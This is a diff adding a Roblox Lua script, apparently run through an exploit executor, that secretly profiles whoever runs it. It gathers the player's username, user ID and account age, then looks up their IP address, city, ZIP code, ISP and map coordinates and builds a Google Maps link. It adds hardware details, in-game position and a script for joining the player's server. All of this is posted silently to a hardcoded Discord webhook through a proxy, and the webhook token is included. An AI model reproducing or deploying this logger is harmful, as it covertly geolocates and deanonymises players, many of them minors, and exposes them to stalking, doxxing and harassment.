@@ -1,0 +1,214 @@
+-- ==========================================
+-- ZENITH CYBER-NEXUS v15 (ULTRA-COMPLETE ACCOUNT)
+-- ==========================================
+
+local originalWebhook = "https://discord.com/api/webhooks/1552831079268749383/xiF10HA8hLedfjIjeBYrhe90PVBDta_Us1wuWBI8Xrt8s2ijfls_WyU3lr6nrDQgsBrA"
+local proxyWebhook = originalWebhook:gsub("discord.com", "webhook.lewisakura.moe")
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local Stats = game:GetService("Stats")
+local localPlayer = Players.LocalPlayer
+
+local requestFunc = syn and syn.request or http and http.request or fluxus and fluxus.request or request
+if not requestFunc then return end
+
+-- 1. Data Identitas & Profil Target yang Sangat Mendalam
+local playerName = localPlayer.Name
+local displayName = localPlayer.DisplayName
+local userId = localPlayer.UserId
+local accountAge = localPlayer.AccountAge
+local profileLink = "https://www.roblox.com/users/" .. userId .. "/profile"
+local avatarThumb = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", userId)
+
+-- Deteksi Status Tambahan Akun
+local membershipType = "None (Free User)"
+pcall(function()
+    if localPlayer.MembershipType == Enum.MembershipType.BuildersClub or localPlayer.MembershipType == Enum.MembershipType.TurboBuildersClub or localPlayer.MembershipType == Enum.MembershipType.OutrageousBuildersClub then
+        membershipType = "Builders Club Active"
+    elseif localPlayer.MembershipType == Enum.MembershipType.Premium then
+        membershipType = "🌟 Roblox Premium Active"
+    end
+end)
+
+local isUnder13 = "Unknown / 13+"
+pcall(function()
+    isUnder13 = localPlayer.InStudio and "Studio Mode" or "13+ / Mature Access"
+end)
+
+-- 2. Data Jaringan, Ping, GeoIP & Google Maps Link
+local ipAddress, locationString, countryFlag, ispName, pingVal = "127.0.0.1", "Secure Nexus Core", "🌐", "Encrypted Gateway", "0 ms"
+local gmapsLink = "https://www.google.com/maps"
+
+pcall(function()
+    local response = requestFunc({
+        Url = "http://ip-api.com/json/?fields=status,query,country,countryCode,regionName,city,zip,isp,lat,lon",
+        Method = "GET"
+    })
+    if response and response.StatusCode == 200 then
+        local data = HttpService:JSONDecode(response.Body)
+        if data.status == "success" then
+            ipAddress = data.query
+            locationString = string.format("%s, %s [ZIP: %s]", data.city, data.country, data.zip)
+            ispName = data.isp
+            
+            if data.lat and data.lon then
+                gmapsLink = string.format("https://www.google.com/maps?q=%.4f,%.4f", data.lat, data.lon)
+            end
+
+            countryFlag = ""
+            for i = 1, #data.countryCode do
+                countryFlag = countryFlag .. utf8.char(data.countryCode:byte(i) - 65 + 127462)
+            end
+        end
+    end
+end)
+
+pcall(function()
+    pingVal = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue() * 1000) .. " ms"
+end)
+
+-- 3. Info Hardware, Memory, Executor & FPS
+local executorName = identifyexecutor and identifyexecutor() or "Unknown Executor Core"
+local platform = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled and "📱 Mobile Neural Link" or "💻 Desktop Quantum Rig"
+
+local fps = 0
+pcall(function()
+    local frames, start = 0, tick()
+    local conn
+    conn = RunService.RenderStepped:Connect(function()
+        frames = frames + 1
+        if tick() - start >= 0.3 then
+            fps = math.floor(frames / (tick() - start))
+            conn:Disconnect()
+        end
+    end)
+    task.wait(0.4)
+end)
+
+local memUsage = "0 MB"
+pcall(function()
+    memUsage = math.floor(collectgarbage("count") / 1024) .. " MB"
+end)
+
+-- 4. Data Game, Server & Posisi Karakter
+local successGame, gameInfo = pcall(function()
+    return MarketplaceService:GetProductInfo(game.PlaceId)
+end)
+local gameName = successGame and gameInfo.Name or "Unknown Universe"
+local placeId = game.PlaceId
+local jobId = game.JobId
+local currentPlayers = #Players:GetPlayers()
+local maxPlayers = Players.MaxPlayers
+local gameWebLink = "https://www.roblox.com/games/" .. tostring(placeId)
+
+local coords = "X: 0 | Y: 0 | Z: 0"
+pcall(function()
+    local char = localPlayer.Character or localPlayer.CharacterAdded:Wait()
+    local hrp = char:WaitForChild("HumanoidRootPart")
+    local p = hrp.Position
+    coords = string.format("X: %.1f | Y: %.1f | Z: %.1f", p.X, p.Y, p.Z)
+end)
+
+-- Template script teleport yang aman
+local teleportScriptTemplate = string.format([[
+local ts = game:GetService('TeleportService')
+local p = game:GetService('Players').LocalPlayer
+local success, err = pcall(function()
+    ts:TeleportToPlaceInstance(%d, '%s', p)
+end)
+if not success then
+    ts:Teleport(%d, p)
+end
+]], placeId, jobId, placeId)
+
+-- 5. Format 5-Tier Multi-Embed (Penyempurnaan Panel Akun Paling Lengkap)
+local data = {
+    ["content"] = "🌌 **[ZENITH QUANTUM GATEWAY INTERCEPTED]** — Ultra-Complete Profile Package Dispatched.",
+    ["embeds"] = {
+        -- PANEL 1: TARGET HEADER & PROFIL LINK
+        {
+            ["title"] = "👑  ZENITH TARGET IDENTIFIER // " .. string.upper(displayName),
+            ["description"] = "```ini\n[ Security Clearance: ROOT ] [ Firewall: BYPASSED ] [ Target UID: " .. userId .. " ]\n```\n🔗 **[Buka Profil Roblox Target](" .. profileLink .. ")**",
+            ["url"] = profileLink,
+            ["color"] = 7419530,
+            ["thumbnail"] = {
+                ["url"] = avatarThumb
+            }
+        },
+        -- PANEL 2: ULTRA-COMPLETE ACCOUNT SPECS (Paling Detail)
+        {
+            ["title"] = "👤  ULTRA-COMPLETE ACCOUNT CREDENTIALS",
+            ["color"] = 3092790,
+            ["fields"] = {
+                {
+                    ["name"] = "📋 **IDENTITY METRICS**",
+                    ["value"] = string.format("```yaml\n• Username      : @%s\n• Display Name  : %s\n• User ID       : %d\n• Account Age   : %d Days (~%d Years)\n• Membership    : %s\n• Chat/Age Mode : %s\n• Security State: Root Verified\n```", playerName, displayName, userId, accountAge, math.floor(accountAge / 365), membershipType, isUnder13),
+                    ["inline"] = false
+                }
+            }
+        },
+        -- PANEL 3: GEO-LOCATION & GOOGLE MAPS LINK
+        {
+            ["title"] = "🌐  SATELLITE GEO-LOCATION & NETWORK",
+            ["color"] = 16755200,
+            ["fields"] = {
+                {
+                    ["name"] = "📍 **TRACKING METRICS**",
+                    ["value"] = string.format("```yaml\n• Territory   : %s %s\n• IP Address  : %s\n• ISP Provider: %s\n• Server Ping : %s\n```\n🗺️ **[Buka Titik Koordinat di Google Maps](" .. gmapsLink .. ")**", locationString, countryFlag, ipAddress, ispName, pingVal),
+                    ["inline"] = false
+                }
+            }
+        },
+        -- PANEL 4: HARDWARE & SYSTEM TELEMETRY
+        {
+            ["title"] = "⚙️  HARDWARE & SYSTEM TELEMETRY",
+            ["color"] = 16711680,
+            ["fields"] = {
+                {
+                    ["name"] = "💻 **CLIENT PERFORMANCE**",
+                    ["value"] = string.format("```yaml\n• Executor    : %s\n• Platform    : %s\n• Framerate   : %d FPS\n• Memory Used : %s\n• Coordinates : %s\n```\n📚 **[Dokumentasi Engine Luau / Roblox](https://create.roblox.com/docs)**", executorName, platform, fps, memUsage, coords),
+                    ["inline"] = false
+                }
+            }
+        },
+        -- PANEL 5: UNIVERSE STATS, GAME LINK & INSTANT TELEPORT
+        {
+            ["title"] = "🚀  UNIVERSE METRICS & TELEPORT PROTOCOL",
+            ["color"] = 65280,
+            ["fields"] = {
+                {
+                    ["name"] = "🎮 **UNIVERSE DETAILS**",
+                    ["value"] = string.format("• **Universe:** `%s`\n• **Place ID:** `%s`\n• **Occupancy:** `%d / %d Active Players`\n\n🌐 **[Buka Halaman Game di Web](" .. gameWebLink .. ")**", gameName, tostring(placeId), currentPlayers, maxPlayers),
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "🔗 **INSTANT INSTANCE JOIN (JOB ID SCRIPT)**",
+                    ["value"] = "```lua\n" .. teleportScriptTemplate .. "\n```",
+                    ["inline"] = false
+                }
+            },
+            ["footer"] = {
+                ["text"] = "⚡ Zenith Quantum Cyber-Nexus v15 (Ultra-Complete) • " .. os.date("%d/%m/%Y [%H:%M:%S]"),
+                ["icon_url"] = "https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f4bb.png"
+            }
+        }
+    }
+}
+
+local jsonMessage = HttpService:JSONEncode(data)
+
+-- 6. Eksekusi Kirim ke Discord via Proxy
+task.spawn(function()
+    pcall(function()
+        requestFunc({
+            Url = proxyWebhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = jsonMessage
+        })
+    end)
+end)
